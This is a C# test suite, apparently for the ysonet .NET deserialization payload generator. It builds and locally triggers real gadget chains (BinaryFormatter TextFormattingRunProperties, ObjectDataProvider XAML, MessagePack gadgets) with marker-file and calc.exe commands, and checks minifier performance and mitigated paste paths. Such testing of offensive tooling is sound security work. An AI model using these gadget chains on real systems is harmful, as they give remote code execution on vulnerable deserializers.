            RunResult badMode = PayloadRunner.RunPlugin("Xps", new[] { "-m", "fdsq", "-c", "calc.exe" });
            AssertTrue(!badMode.Success, "an unknown part mode fails");

            RunResult noCommand = PayloadRunner.RunPlugin("Xps", new[] { "-m", "fdseq" });
            AssertTrue(!noCommand.Success, "an empty command fails");
        }

        // Plugin options live in static fields and the suite runs plugins repeatedly in one
        // process, so a second run must not inherit the first one's mode or flags.
        private static void XpsOptionsDoNotLeak()
        {
            RunResult all = PayloadRunner.RunPlugin("Xps", new[] { "-m", "all", "-c", "calc.exe" });
            AssertTrue(all.Success, "Xps -m all runs: " + all.ErrorMessage);

            // No -m this time: it must fall back to the documented default, not stay on "all".
            RunResult second = PayloadRunner.RunPlugin("Xps", new[] { "-c", "calc.exe" });
            AssertTrue(second.Success, "Xps without -m runs: " + second.ErrorMessage);

            AssertTrue(Bytes(second.Raw).Length < Bytes(all.Raw).Length,
                "the second run used the fdseq default, not the leaked 'all' mode");
        }

        // Triggering harness: build each Clipboard delivery payload exactly as the
        // plugin does, then drive the target's deserialization/paste path and prove
        // the command fired (a marker file only a fired gadget could create). This
        // runs the payload locally, like the plugin's own --test - the authorized
        // self-test of an offensive tool.
        private static void ClipboardPayloadsTrigger()
        {
            // winforms delivery: AxHost.State -> BinaryFormatter TextFormattingRunProperties.
            AssertTrue(WinformsPayloadTriggers(),
                "winforms clipboard payload triggers the command on BinaryFormatter deserialization");

            // wpfxaml, both XAML variants: they must FIRE on the vulnerable
            // (non-restrictive) paste path...
            AssertTrue(WpfXamlPayloadRuns(1, false), "wpfxaml variant 1 triggers on a non-restrictive paste");
            AssertTrue(WpfXamlPayloadRuns(2, false), "wpfxaml variant 2 triggers on a non-restrictive paste");
            // ...and must be BLOCKED on the mitigated (restrictive) default paste.
            AssertTrue(!WpfXamlPayloadRuns(1, true), "wpfxaml variant 1 is blocked on a restrictive paste");
            AssertTrue(!WpfXamlPayloadRuns(2, true), "wpfxaml variant 2 is blocked on a restrictive paste");
        }

        private static bool WinformsPayloadTriggers()
        {
            string marker = TestArtifactPath("ysonet_clip_winforms.txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
            ia.IsRawCmd = true;

            // Same object the plugin puts on the clipboard for winforms delivery.
            object gadget = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(ia);
            AxHostStateMarshal marshal = new AxHostStateMarshal(gadget);

            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            byte[] bytes;
            using (var ms = new MemoryStream()) { bf.Serialize(ms, marshal); bytes = ms.ToArray(); }

            // A target reading GetData(format) deserializes it with BinaryFormatter.
            RunSTA(delegate { using (var ms = new MemoryStream(bytes)) { bf.Deserialize(ms); } });

            // Only ever asserted positively, so it gets the full marker budget.
            bool ran = WaitForFile(marker, MarkerWaitMs);
            SafeDelete(marker);
            return ran;
        }

        private static bool WpfXamlPayloadRuns(int variant, bool restrictive)
        {
            string marker = TestArtifactPath(
                "ysonet_clip_wpf_" + variant + "_" + (restrictive ? "r" : "n") + ".txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
            ia.IsRawCmd = true;

            // Same XAML the plugin places under the WPF 'Xaml' clipboard format.
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new string[] { "--variant", variant.ToString() });
            string xaml = (string)gen.Generate("xaml", ia);

            RunSTA(delegate
            {
                if (restrictive) SerializersHelper.Xaml_deserialize_restrictive(xaml);
                else SerializersHelper.Xaml_deserialize(xaml);
            });

            // The restrictive case asserts ABSENCE, so it keeps a short bound (waiting
            // longer for something that must never appear only slows the suite). The
            // non-restrictive case must fire, so it gets the full marker budget.
            bool ran = WaitForFile(marker, restrictive ? 2500 : MarkerWaitMs);
            SafeDelete(marker);
            return ran;
        }

        // Run an action on an STA thread (WPF XamlReader and WinForms deserialization
        // expect it). Swallows exceptions: a gadget may throw after it fires, so the
        // marker file, not the return, is the proof.
        // Exceptions are swallowed on purpose: most gadgets throw AFTER firing, so a
        // throw here is not evidence that the payload failed. The cost is that a real
        // harness bug inside the delegate (a bad cast, a wrong payload shape) is
        // reported only as the generic "marker not created" and looks exactly like a
        // payload that did not fire. Under YSONET_TRACE the swallowed exception is
        // printed, so that case can be diagnosed without editing this file.
        private static void RunSTA(System.Threading.ThreadStart action)
        {
            bool traceThrows = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            var t = new System.Threading.Thread(delegate ()
            {
                try { action(); }
                catch (Exception ex)
                {
                    if (traceThrows)
                    {
                        Console.Error.WriteLine("    [sta-throw] " + ex.GetType().Name + ": " + ex.Message);
                        Console.Error.Flush();
                    }
                }
            });
            t.SetApartmentState(System.Threading.ApartmentState.STA);
            t.Start();
            t.Join();
        }

        // How long a fired payload gets to drop its marker file (or directory).
        //
        // The payload spawns a real process (`cmd /c echo x > marker`), so the marker
        // lands asynchronously and this budget is pure wall clock. A short budget is a
        // false-negative generator: on a loaded machine a run reported 34 "marker not
        // created" failures while EVERY one of those markers was in fact written a few
        // seconds later. The proof was the leftover files - the finally-delete ran
        // before the write, so the marker survived the test that had already given up.
        //
        // Raising the ceiling does not weaken anything: a healthy row still has to
        // produce the marker, and WaitForFile polls every 100ms so it returns the
        // moment the file appears. The cost is paid only when a payload genuinely does
        // not fire, which is exactly when waiting longer is worth it.
        private const int MarkerWaitMs = 15000;

        private static bool WaitForFile(string path, int totalMs)
        {
            int waited = 0;
            while (waited < totalMs)
            {
                if (File.Exists(path)) return true;
                System.Threading.Thread.Sleep(100);
                waited += 100;
            }
            return File.Exists(path);
        }

        private static void RestrictiveXamlBlocksGadget()
        {
            // The wpfxaml mode's --test relies on this: the restrictive reader (the
            // default WPF paste path since the CVE-2020-0605/0606 mitigation) must
            // block the ObjectDataProvider gadget so the command does NOT run. On a
            // mitigated framework it blocks silently (no throw); older ones may throw.
            // Either way the gadget must not execute, so we assert on a marker file
            // that only a fired gadget would create, not on an exception.
            string marker = TestArtifactPath("ysonet_restrictive_xaml_test.txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo blocked > \"" + marker + "\"";
            ia.IsRawCmd = true;
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new string[] { "--variant", "2" });
            string xaml = (string)gen.Generate("xaml", ia);

            AssertTrue(xaml.Contains("ObjectDataProvider"), "payload is an ObjectDataProvider gadget");
            AssertTrue(xaml.Contains("ResourceDictionary"), "variant 2 is a ResourceDictionary wrapper");

            try { SerializersHelper.Xaml_deserialize_restrictive(xaml); }
            catch (Exception) { /* some frameworks throw when blocking; that is still a block */ }

            System.Threading.Thread.Sleep(300);
            bool ran = File.Exists(marker);
            if (ran) File.Delete(marker);
            AssertTrue(!ran, "restrictive XAML load must block the gadget (marker must not be created)");
        }

        // Guards the whole CLI --help/--fullhelp surface against the NDesk.Options
        // wrap-loop hang (see Helpers/HelpText.cs). It renders every plugin's and
        // gadget's option help through the production HelpText path on a worker
        // thread with a timeout. Before the fix, "ysonet.exe -p clipboard --help"
        // spun forever inside WriteOptionDescriptions; this fails instead of hanging
        // if any option description ever regresses that way again.
        private static void OptionHelpNeverHangs()
        {
            var sets = new List<KeyValuePair<string, OptionSet>>();

            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                OptionSet o = g == null ? null : g.Options();
                if (o != null) sets.Add(new KeyValuePair<string, OptionSet>("gadget " + name, o));
            }
            foreach (string name in PluginRegistry.GetAllPluginNames())
            {
                IPlugin p = PluginRegistry.CreatePluginInstance(name);
                OptionSet o = p == null ? null : p.Options();
                if (o != null) sets.Add(new KeyValuePair<string, OptionSet>("plugin " + name, o));
            }

            AssertTrue(sets.Count > 0, "found plugin/gadget option sets to render");

            foreach (KeyValuePair<string, OptionSet> kv in sets)
            {
                OptionSet opts = kv.Value;
                Exception err = null;
                StringWriter sw = new StringWriter();
                System.Threading.Thread t = new System.Threading.Thread(delegate ()
                {
                    try { HelpText.WriteOptionDescriptions(opts, sw); }
                    catch (Exception e) { err = e; }
                });
                t.IsBackground = true; // a genuine hang must not keep the test process alive
                t.Start();
                bool done = t.Join(System.TimeSpan.FromSeconds(10));
                AssertTrue(done, "option help render hung (NDesk wrap loop) for " + kv.Key);
                AssertTrue(err == null, "option help render threw for " + kv.Key + ": " + (err == null ? "" : err.Message));
                // The render must actually produce help text (it has at least one option).
                AssertTrue(sw.ToString().Trim().Length > 0, "option help produced output for " + kv.Key);
            }
        }

        // Unit test for the soft-break that makes the render safe. A whitespace-free
        // token longer than the NDesk wrap width is what triggers the loop, so
        // SoftBreak must shrink every run to the safe width while only inserting
        // spaces (never dropping or changing characters).
        private static void SoftBreakWrapsLongTokens()
        {
            // The real clipboard --mode token that caused the hang.
            string token = "Switch.System.Windows.EnableLegacyDangerousClipboardDeserializationMode=true";
            AssertTrue(HelpText.LongestUnbrokenRun(token) > HelpText.MaxTokenLength,
                "sample token is long enough to trigger the NDesk hang");

            string broken = HelpText.SoftBreak(token);
            AssertTrue(HelpText.LongestUnbrokenRun(broken) <= HelpText.MaxTokenLength,
                "soft-break keeps every run within the safe wrap width");
            AssertEqual(token, broken.Replace(" ", ""),
                "soft-break only inserts spaces; all original characters are kept");

            // Text that already wraps is returned untouched.
            string ok = "a normal help line with short words";
            AssertEqual(ok, HelpText.SoftBreak(ok), "short text is returned unchanged");
            AssertEqual("", HelpText.SoftBreak(""), "empty text is safe");
            AssertEqual(null, HelpText.SoftBreak(null), "null text is safe");
        }

        // Correctness lock for the XmlMinifier "remove soap encodingStyle" fix in
        // XmlParserNamespaceMinifier: the tighter NCName prefix class must still strip a real
        // soap-envelope encodingStyle, and must still leave a non-soap encodingStyle alone.
        // (The performance side of that fix, and the XSLT namespace fix, are locked by
        // XmlMinifierScalesOnBigPayload below.) These run on fixed strings, no compile.
        private static void XmlMinifierEncodingStyle()
        {
            // 1) Soap encodingStyle IS still removed: the tighter class matches a real
            // soap-envelope prefix identically. Declare SOAP-ENV as the soap-envelope
            // namespace and put encodingStyle on an element; the minified output must not
            // contain "encodingStyle" any more.
            string soapDoc =
                "<root xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                + "<item SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">x</item></root>";
            string soapResult = XmlMinifier.Minify(soapDoc, null, null);
            AssertTrue(soapResult.IndexOf("encodingStyle", StringComparison.Ordinal) < 0,
                "soap-envelope encodingStyle is stripped by the minifier");

            // 2) A NON soap-envelope encodingStyle is preserved: only the soap-envelope one
            // is stripped. foo maps to a non-soap namespace, so its encodingStyle stays.
            string nonSoapDoc =
                "<root xmlns:foo=\"http://example.com/notsoap\">"
                + "<item foo:encodingStyle=\"http://example.com/enc\">x</item></root>";
            string nonSoapResult = XmlMinifier.Minify(nonSoapDoc, null, null);
            AssertTrue(nonSoapResult.IndexOf("encodingStyle", StringComparison.Ordinal) >= 0,
                "a non soap-envelope encodingStyle attribute is left untouched");
        }

        // Big-payload performance lock for XmlMinifier. This is the shape the file gadgets
        // (DataSetOldBehaviourFromFile and friends) embed: a ResourceDictionary whose
        // ObjectDataProvider carries the inline compiled assembly as a long whitespace-free
        // run of <s:Byte> elements. Two separate O(n^2) bugs used to make minifying it blow
        // up (DataSetOldBehaviourFromFile --minify was ~112s at a small size, ~200s+ at a
        // larger one):
        //   1. the "remove soap encodingStyle" regex backtracked over the whitespace-free run
        //      (fixed with a guard + a tighter prefix class), and
        //   2. the XSLT "drop unused namespaces" pass ran a //* document scan once per element
        //      for the reserved xml namespace, which is O(elements^2) (fixed by excluding the
        //      xml namespace, a no-op for the output).
        // Both bugs make this run far longer than the backstop, so the test would fail fast on
        // a regression. It is a genuinely BIG payload (tens of thousands of elements) so the
        // quadratic behaviour, not just a constant, is what is measured. Runs on a background
        // thread with a wall-clock backstop, same shape as OptionHelpNeverHangs.
        private static void XmlMinifierScalesOnBigPayload()
        {
            // ~30000 byte elements (~0.5 MB). Whitespace-free, exactly like the real encoder
            // output. All of the declared prefixes (default, x, s, r) ARE used, so only the
            // fixed code keeps the pass linear; a regression of either O(n^2) bug hangs it.
            StringBuilder bytes = new StringBuilder();
            for (int i = 0; i < 30000; i++) bytes.Append("<s:Byte>77</s:Byte>");
            string bigResourceDict =
                "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\""
                + " xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\""
                + " xmlns:s=\"clr-namespace:System;assembly=mscorlib\""
                + " xmlns:r=\"clr-namespace:System.Reflection;assembly=mscorlib\">"
                + "<ObjectDataProvider x:Key=\"asmLoad\" ObjectType=\"{x:Type r:Assembly}\" MethodName=\"Load\">"
                + "<x:Array Type=\"s:Byte\">" + bytes + "</x:Array>"
                + "</ObjectDataProvider></ResourceDictionary>";

            string result = null;
            Exception threadErr = null;
            System.Threading.Thread t = new System.Threading.Thread(delegate ()
            {
                try { result = XmlMinifier.Minify(bigResourceDict, null, null); }
                catch (Exception e) { threadErr = e; }
            });
            t.IsBackground = true; // a genuine hang must not keep the test process alive
            t.Start();
            bool done = t.Join(System.TimeSpan.FromSeconds(20));
            AssertTrue(done, "XmlMinifier hung on a big inline-assembly payload (O(n^2) regression in the encodingStyle scan or the XSLT namespace pass)");
            AssertTrue(threadErr == null, "XmlMinifier threw on a big inline-assembly payload: " + (threadErr == null ? "" : threadErr.Message));
            AssertTrue(!string.IsNullOrEmpty(result), "big-payload minify produced a non-empty result");
            // The payload must survive: still well-formed XML and still carrying the byte array.
            System.Xml.XmlDocument parsed = new System.Xml.XmlDocument();
            parsed.LoadXml(result);
            AssertTrue(result.IndexOf("Byte", StringComparison.Ordinal) >= 0,
                "the minified big payload still contains its byte array");
        }

        // Performance lock for the XmlDirtyMatchReplaceMinifier "remove spaces around
        // separators" pass (the third regex). It used to be O(n^2) on a long whitespace-free
        // run of class characters inside a quoted attribute (the ApplicationTrust hex
        // Data="..." shape): the greedy class run was consumed from every start position and
        // then failed to find a ';'/','. The plain XmlMinifierScalesOnBigPayload above does
        // NOT catch this, because its <s:Byte> run is broken by '<'/'>' every few chars, so no
        // single class-run is long. This test fires the exact worst case. Two payloads lock
        // the two independent fix mechanisms:
        //   GUARD path: no ';'/',' anywhere, so the whole block is skipped. A lookbehind-only
        //     revert still passes this; a guard revert would still be linear thanks to the
        //     lookbehind, so this case mainly exercises the guard's fast path.
        //   LOOKBEHIND path: a comma is present, so the guard does NOT skip the block. Only the
        //     negative-lookbehind anchor keeps the big run linear here; a lookbehind revert
        //     reintroduces the O(n^2) blow-up and this case would exceed the backstop.
        // Both are ~40s+ on the pre-fix code and near-instant on the fixed code, so a real
        // regression fails fast. Background thread + 20s wall-clock backstop, same shape as
        // XmlMinifierScalesOnBigPayload.
        private static void XmlMinifierDirtyMatchScalesOnHexAttribute()
        {
            string bigRun = new string('A', 40000);

            // GUARD path: one long whitespace-free run, no ';'/',' anywhere, terminated by '"'.
            string guardDoc = "<ExtraInfo Data=\"" + bigRun + "\"></ExtraInfo>";
            RunMinifyWithBackstop(guardDoc, "guard path (pure hex, no ';'/',')");

            // LOOKBEHIND path: same big run, but a comma elsewhere means the guard cannot skip
            // the block, so only the lookbehind keeps it linear. Wrapped in a single root so it
            // is well-formed XML for the XSLT pass.
            string lookbehindDoc = "<root><n Type=\"x, Version=1\"/><ExtraInfo Data=\"" + bigRun + "\"></ExtraInfo></root>";
            RunMinifyWithBackstop(lookbehindDoc, "lookbehind path (big run + a comma elsewhere)");
        }

        // Helper: run XmlMinifier.Minify on a background thread with a 20s wall-clock backstop
        // and assert it finished, did not throw, is non-empty, and still carries its big run.
        private static void RunMinifyWithBackstop(string doc, string label)
        {
            string result = null;
            Exception threadErr = null;
            System.Threading.Thread t = new System.Threading.Thread(delegate ()
            {
                try { result = XmlMinifier.Minify(doc, null, null); }
                catch (Exception e) { threadErr = e; }
            });
            t.IsBackground = true; // a genuine hang must not keep the test process alive
            t.Start();
            bool done = t.Join(System.TimeSpan.FromSeconds(20));
            AssertTrue(done, "XmlMinifier dirty-match pass hung on the " + label + " (O(n^2) regression in the separator regex)");
            AssertTrue(threadErr == null, "XmlMinifier threw on the " + label + ": " + (threadErr == null ? "" : threadErr.Message));
            AssertTrue(!string.IsNullOrEmpty(result), "dirty-match minify produced a non-empty result on the " + label);
            AssertTrue(result.IndexOf(new string('A', 1000), StringComparison.Ordinal) >= 0,
                "the minified payload still contains its big run on the " + label);
        }

        // Output-equivalence lock for the XmlDirtyMatchReplaceMinifier guard+lookbehind fix.
        // The golden strings were captured from the CURRENT pre-fix build (before the fix was
        // applied), so an exact match proves the fix did not change any real minifier output.
        // These are the exact shapes the fix's correctness argument reasons about: assembly
        // qualified names, clr-namespace, the { x:Type } markup extension, a method signature,
        // a spaced list, and a pure-hex attribute (the guard path). Fixed strings, no compile.
        private static void XmlMinifierDirtyMatchOutputUnchanged()
        {
            // Assembly-qualified name with commas: spaces after the commas are removed.
            AssertEqual(
                "<r Type=\"Microsoft.IdentityModel,Version=3.5.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35\"/>",
                XmlMinifier.Minify("<r Type=\"Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\"/>", null, null),
                "AQN commas minify unchanged");

            // clr-namespace with a semicolon separator: space after ';' removed.
            AssertEqual(
                "<r Type=\"clr-namespace:System.Diagnostics;assembly=system\"/>",
                XmlMinifier.Minify("<r Type=\"clr-namespace:System.Diagnostics; assembly=system\"/>", null, null),
                "clr-namespace semicolon minify unchanged");

            // { x:Type Diag:Process } markup extension: braces tightened, inner space kept.
            AssertEqual(
                "<r Value=\"{x:Type Diag:Process}\"/>",
                XmlMinifier.Minify("<r Value=\"{ x:Type Diag:Process }\"/>", null, null),
                "x:Type markup extension minify unchanged");

            // Method signature with a comma: unchanged, because the ')' terminator is not in the
            // regex's terminator class, so the pre-fix regex never matched it either.
            AssertEqual(
                "<r Sig=\"Int32 Compare(System.String, System.String)\"/>",
                XmlMinifier.Minify("<r Sig=\"Int32 Compare(System.String, System.String)\"/>", null, null),
                "method signature minify unchanged");

            // Spaced list with both separators: all spaces removed.
            AssertEqual(
                "<r List=\"foo,bar;baz\"/>",
                XmlMinifier.Minify("<r List=\"foo , bar ; baz\"/>", null, null),
                "spaced list minify unchanged");

            // Pure-hex attribute, no ';'/',' (guard path): passes through unchanged.
            AssertEqual(
                "<r Data=\"AABBCCDDEEFF00112233445566778899\"/>",
                XmlMinifier.Minify("<r Data=\"AABBCCDDEEFF00112233445566778899\"/>", null, null),
                "pure-hex attribute minify unchanged (guard path)");
        }

        // Locks the leading-space trim added to XmlDirtyMatchReplaceMinifier's space-removal
        // delegate. The outer assembly of a generic type is emitted with a space after the
        // closing brackets, e.g. "]], System.Data.Services". The run match starts right after
        // those brackets, so the three original passes (each needs a captured char on the space's
        // left) cannot reach it; only the new leading-space trim removes it. The other
        // assembly-name shapes stay byte-identical (see XmlMinifierDirtyMatchOutputUnchanged).
        private static void XmlMinifierTrimsLeadingSpaceInGenericTypeName()
        {
            string input = "<root type=\"A`2[[X, PF, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"/>";
            string result = XmlMinifier.Minify(input, null, null);
            AssertTrue(result.IndexOf("]],System.Data.Services,", StringComparison.Ordinal) >= 0,
                "leading space after the generic ']]' is trimmed: " + result);
            AssertTrue(result.IndexOf("]], System", StringComparison.Ordinal) < 0,
                "no space survives after the generic brackets: " + result);
            AssertTrue(XmlWellFormednessError(result) == null,
                "trimmed output stays well-formed XML: " + result);
        }

        // Locks the namespace cleanup XmlDirtyMatchReplaceMinifier runs after the discardable
        // regexes. A discard can delete the only use of a namespace, and the XSLT unused-namespace
        // pass has already run by then, so the minifier re-runs it to drop the now-orphaned
        // declaration. Also verifies the guard: a discard that leaves non-well-formed XML (a
        // stripped closing tag, as ResourceSet does deliberately) must not throw and must keep
        // the discarded text.
        private static void XmlMinifierRemovesNamespaceOrphanedByDiscard()
        {
            string input = "<root xmlns:p=\"http://keep.example/ns\" xmlns:q=\"http://drop.example/ns\"><p:Keep>x</p:Keep><q:Drop Marker=\"y\"/></root>";

            // (a) Discard the only element that uses the 'q' namespace; its xmlns must be dropped
            // while the still-used 'p' namespace stays, and the result must remain well-formed.
            string orphaned = XmlMinifier.Minify(input, null, new string[] { "<[a-zA-Z]:Drop[^>]*/>" });
            AssertTrue(orphaned.IndexOf("http://keep.example/ns", StringComparison.Ordinal) >= 0,
                "still-used namespace is kept: " + orphaned);
            AssertTrue(orphaned.IndexOf("http://drop.example/ns", StringComparison.Ordinal) < 0,
                "orphaned namespace is removed after the discard: " + orphaned);
            AssertTrue(XmlWellFormednessError(orphaned) == null,
                "orphan-cleaned output is well-formed XML: " + orphaned);

            // (b) A discard that removes a closing tag leaves malformed XML on purpose; the
            // re-parse is guarded, so Minify must not throw and must keep the discarded result.
            string malformed = null;
            bool threw = false;
            try { malformed = XmlMinifier.Minify(input, null, new string[] { "</root>" }); }
            catch { threw = true; }
            AssertTrue(!threw, "a discard that breaks well-formedness must not throw");
            AssertTrue(malformed != null && malformed.IndexOf("</root>", StringComparison.Ordinal) < 0,
                "the closing-tag discard was applied: " + malformed);
            AssertTrue(malformed != null && malformed.IndexOf("Keep", StringComparison.Ordinal) >= 0,
                "surviving content is kept after the guarded re-parse: " + malformed);
        }

        private static void NonRcePayloadsAreGadgets()
        {
            AssertTrue(!PluginRegistry.PluginExists("NetNonRceGadgets"),
                "the former NetNonRceGadgets plugin is no longer registered");

            IGenerator pictureBox = Gadget("PictureBox");
            IGenerator progress = Gadget("InfiniteProgressPage");
            IGenerator fileLog = Gadget("FileLogTraceListener");
            AssertEqual(CommandInputType.Url, pictureBox.CommandInput(), "PictureBox takes a URL");
            AssertEqual(CommandInputType.Url, progress.CommandInput(), "InfiniteProgressPage takes a URL");
            // Target-side, not local: the directory is created by the DESERIALIZING
            // process, and nothing is read on the operator machine.
            AssertEqual(CommandInputType.TargetPath, fileLog.CommandInput(), "FileLogTraceListener takes a target path");

            GadgetCapability pictureBoxCapability = GadgetFacetReader.Expand(pictureBox)[0];
            GadgetCapability progressCapability = GadgetFacetReader.Expand(progress)[0];
            GadgetCapability fileLogCapability = GadgetFacetReader.Expand(fileLog)[0];
            AssertTrue(pictureBoxCapability.Kinds.Contains(PayloadKind.Network), "PictureBox is a network gadget");
            AssertTrue(progressCapability.Kinds.Contains(PayloadKind.Network), "InfiniteProgressPage is a network gadget");
            AssertTrue(fileLogCapability.Kinds.Contains(PayloadKind.FileSystem), "FileLogTraceListener is a file-system gadget");
            AssertSetEqual(fileLogCapability.Inputs, new[] { PayloadInput.TargetPath },
                "FileLogTraceListener's accepted input is a target path");
            // It deliberately does NOT declare denial-of-service. That facet drives the
            // DosPolicy safeguards (refusal without --i-understand-dos, exclusion from
            // every bulk run), which are for a payload whose purpose is to take the
            // target down. Here the denial of service is a conditional consequence of
            // where the directory is created, so it is stated in AdditionalInfo instead.
            AssertTrue(!fileLogCapability.Kinds.Contains(PayloadKind.DenialOfService),
                "FileLogTraceListener is not gated as a denial-of-service gadget");
            AssertTrue(fileLog.AdditionalInfo().ToLowerInvariant().Contains("denial of service"),
                "the possible denial-of-service effect is still disclosed in AdditionalInfo");

            foreach (IGenerator gadget in new[] { pictureBox, progress, fileLog })
            {
                var formatters = new List<string>();
                foreach (string formatter in gadget.SupportedFormatters())
                    formatters.Add(GadgetFacetReader.CleanFormatter(formatter));
                foreach (string expected in new[] { "Json.NET", "FastJson", "JavaScriptSerializer", "YamlDotNet", "Xaml" })
                    AssertTrue(formatters.Contains(expected), gadget.Name() + " supports " + expected);

                bool shouldHaveMessagePack = gadget.Name() != "InfiniteProgressPage";
                foreach (string messagePack in new[] { "MessagePackTypeless", "MessagePackTypelessLz4" })
                    AssertEqual(shouldHaveMessagePack, formatters.Contains(messagePack),
                        gadget.Name() + " MessagePack support is effect-proven");

                AssertTrue(formatters.Contains("SharpSerializerXml"),
                    gadget.Name() + " SharpSerializer XML support preserves setter order");
                AssertTrue(!formatters.Contains("SharpSerializerBinary"),
                    gadget.Name() + " does not claim unproven SharpSerializer binary support");

                bool shouldHaveDataContractJson = gadget.Name() == "FileLogTraceListener";
                AssertEqual(shouldHaveDataContractJson, formatters.Contains("DataContractJsonSerializer"),
                    gadget.Name() + " DataContractJson support is effect-proven");
                foreach (string dataContractXml in new[] { "DataContractSerializer", "NetDataContractSerializer" })
                    AssertTrue(!formatters.Contains(dataContractXml),
                        gadget.Name() + " does not claim DataContract XML support that bypasses the effect");
            }
        }

        // Every text formatter exposed by the non-RCE gadgets has a safe minifier.
        // End-to-end firing of both minify states is covered in PayloadsFireIntoTestSinks.
        private static void NonRcePayloadsMinify()
        {
            foreach (string gadget in new[] { "PictureBox", "InfiniteProgressPage", "FileLogTraceListener" })
            {
                var formatters = new List<string> { "Json.NET", "FastJson", "JavaScriptSerializer", "YamlDotNet", "SharpSerializerXml", "Xaml" };
                // FileLogTraceListener takes a directory path, the other two take a URL.
                string sample = gadget == "FileLogTraceListener" ? @"C:\ysonet_min_probe" : "http://localhost/y";
                foreach (string formatter in formatters)
                {
                    InputArgs plainInput = new InputArgs();
                    plainInput.Cmd = sample;
                    RunResult plain = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = gadget,
                        FormatterName = formatter,
                        InputArgs = plainInput,
                    });

                    InputArgs minInput = new InputArgs();
                    minInput.Cmd = sample;
                    minInput.Minify = true;
                    RunResult min = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = gadget,
                        FormatterName = formatter,
                        InputArgs = minInput,
                    });

                    AssertTrue(plain.Success && min.Success, gadget + " " + formatter + " generates: " + plain.ErrorMessage + " / " + min.ErrorMessage);
                    AssertTrue(RawLength(min.Raw) < RawLength(plain.Raw),
                        gadget + " " + formatter + " is minified (" + RawLength(min.Raw) + " < " + RawLength(plain.Raw) + ")");
                    if (formatter == "Xaml" || formatter == "SharpSerializerXml")
                    {
                        AssertTrue(XmlWellFormednessError(min.Raw) == null,
                            gadget + " minified " + formatter + " is well-formed XML");
                    }
                }
            }
        }

        // A gadget whose sink is a property SETTER or a getter chain must never construct its
        // real target - assigning the property IS the effect - so it hands a SURROGATE graph
        // with the same member names to MessagePackTypelessTypeSwap and relies on the
        // type-name cache swap to write the FRAMEWORK name into the stream.
        //
        // That swap fails SILENTLY: the payload still generates and is still valid MessagePack,
        // it just carries a ysonet surrogate name that no target can resolve. Generation
        // therefore proves nothing, so the emitted bytes are read here. This is also what
        // guards the surrogate shapes living inside their own gadget class: renaming, moving or
        // nesting one must not change the name on the wire.
        //
        // Only the uncompressed flavour can be read as text. The Lz4 flavour runs the same swap
        // before compressing, and PictureBox's two Lz4 rows are fired end to end in
        // PayloadsFireIntoTestSinks.
        private static void MessagePackTypelessCarriesTargetTypeNames()
        {
            var rows = new[]
            {
                new object[] { "PictureBox", "http://127.0.0.1:1/y", new[] {
                    "System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" } },
                // A relative target-side name: nothing is deserialized here, so no directory is
                // created, and it keeps a machine-specific path out of the test.
                new object[] { "FileLogTraceListener", "ysonet_mp_probe_dir", new[] {
                    "Microsoft.VisualBasic.Logging.FileLogTraceListener, Microsoft.VisualBasic, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" } },
                // Two names, not three: MessagePack Typeless writes a type name only where the
                // static type is object (the root, and ObjectInstance). StartInfo is declared as
                // its own concrete type, so it travels as a bare map and the target resolves it
                // from the real Process.StartInfo property type.
                new object[] { "ObjectDataProvider", "calc.exe", new[] {
                    "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                    "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" } },
                new object[] { "GetterSettingsPropertyValue", "calc.exe", new[] {
                    "System.Configuration.SettingsPropertyValue, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089",
                    "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089" } },
            };

            foreach (object[] row in rows)
            {
                string gadget = (string)row[0];
                string sample = (string)row[1];

                InputArgs plainArgs = new InputArgs();
                plainArgs.Cmd = sample;
                RunResult plain = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = gadget,
                    FormatterName = "MessagePackTypeless",
                    InputArgs = plainArgs,
                });
                AssertTrue(plain.Success, gadget + " MessagePackTypeless generates: " + plain.ErrorMessage);

                string text = Text(plain.Raw);
                foreach (string expected in (string[])row[2])
                    AssertTrue(text.IndexOf(expected, StringComparison.Ordinal) >= 0,
                        gadget + " MessagePackTypeless writes the target type name: " + expected);
                AssertTrue(text.IndexOf("Surrogate", StringComparison.Ordinal) < 0,
                    gadget + " MessagePackTypeless leaks no surrogate type name");

                InputArgs lz4Args = new InputArgs();
                lz4Args.Cmd = sample;
                RunResult lz4 = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = gadget,
                    FormatterName = "MessagePackTypelessLz4",
                    InputArgs = lz4Args,
                });
